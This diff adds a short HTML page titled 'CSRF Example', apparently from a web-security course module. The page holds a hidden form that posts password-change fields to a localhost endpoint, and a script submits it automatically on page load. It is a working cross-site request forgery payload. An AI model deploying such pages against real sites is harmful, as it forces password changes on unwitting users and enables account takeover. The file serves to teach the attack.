@@ -1,0 +1,25 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>CSRF Example</title>
+  </head>
+  <body>
+    <h1>Change your password! HACK</h1>
+    <form
+      action="http://127.0.0.1:5500/Module%209/csrf/index.html/change-password"
+      method="post"
+      id="csrf-form"
+    >
+      <input
+        type="hidden"
+        name="current_password"
+        value="attacker's password"
+      />
+      <input type="hidden" name="new_password" value="new password" />
+      <input type="hidden" name="confirm_password" value="new password" />
+    </form>
+    <script>
+      document.getElementById('csrf-form').submit();
+    </script>
+  </body>
+</html>
